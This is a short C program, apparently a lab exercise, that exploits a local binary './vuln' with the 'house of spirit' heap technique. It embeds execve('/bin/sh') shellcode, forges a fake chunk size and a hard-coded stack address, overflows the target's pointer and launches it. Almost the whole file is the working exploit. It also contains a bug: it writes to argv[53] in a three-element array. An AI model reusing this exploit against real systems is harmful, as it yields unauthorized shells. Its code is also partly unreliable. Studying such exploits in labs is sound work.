/* Program to exploit executable 'vuln' using hos technique.
 */
#include <string.h>
#include <unistd.h>


#define VULNERABLE "./vuln"

/* Shellcode to spwan a shell. Size: 48 bytes - Includes Return Address overwrite */
char scode[] =
	"\xeb\x0e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xb8\xfd\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90"; 

int main( void )
{
        int i;
	char * p;
        char argv1[54];
        char * argv[] = { VULNERABLE, argv1, NULL };
        
	strcpy(argv1,scode);

	/* Overwrite ptr1 in vuln with stack address - 0xbffffdf0. Overwrite local_age in vuln with chunk size - 0x30 */
	strcpy(argv1+48,"\xf0\xfd\xff\xbf\x30"); 
        
        argv[53] = '\0';

        /* Execution of the vulnerable program */
        execve( argv[0], argv, NULL );
        return( -1 );
}
